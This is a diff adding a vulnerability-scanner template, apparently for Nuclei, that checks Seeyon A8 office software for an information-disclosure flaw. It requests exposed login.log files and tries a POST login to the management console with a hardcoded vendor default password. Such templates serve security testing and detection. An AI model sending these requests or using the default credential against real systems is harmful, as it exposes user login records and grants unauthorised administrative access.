@@ -1,0 +1,51 @@
+id: wooyun-2015-0157458
+info:
+  name: Seeyon A8 Collaborative System Sensitive Information Disclosure (2 Locations)
+  author:
+  - 折跃
+  description: |-
+    Seeyon A8 Collaborative System Sensitive Information Disclosure Vulnerability
+    Seeyon A8 Collaborative Management Software is a batch-deployable collaborative office software targeting mid-to-high-end enterprises, research institutions, government agencies, public institutions, and foreign-related organizations.
+
+    Seeyon A8 has a sensitive information disclosure vulnerability. An attacker can exploit it to obtain sensitive system information.
+  severity: high
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    https://www.seeyon.com/
+
+    Temporary remediation:
+    1. Remove sensitive information exposed on pages or delete the pages that leak information
+    2. Encrypt sensitive information at rest and avoid sending it to the frontend unless necessary
+    3. Transmit sensitive information over encrypted channels and apply data masking where necessary
+    4. Enforce strict permission authentication for sensitive data that must be sent and for page request APIs
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - regex("\d{2}\:\d{2}\:\d{2}(.*),\s?((?:\d{1,3}\.){3}\d{1,3})",body)
+  path:
+  - '{{BaseURL}}/seeyon//logs/login.log'
+  - '{{BaseURL}}/logs/login.log'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==302
+    - contains(all_headers,"seeyon/management/status.jsp")
+  path:
+  - '{{BaseURL}}/seeyon/management/index.jsp'
+  - '{{BaseURL}}/management/index.jsp'
+  method: POST
+  body: password=WLCCYBD@SEEYON
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
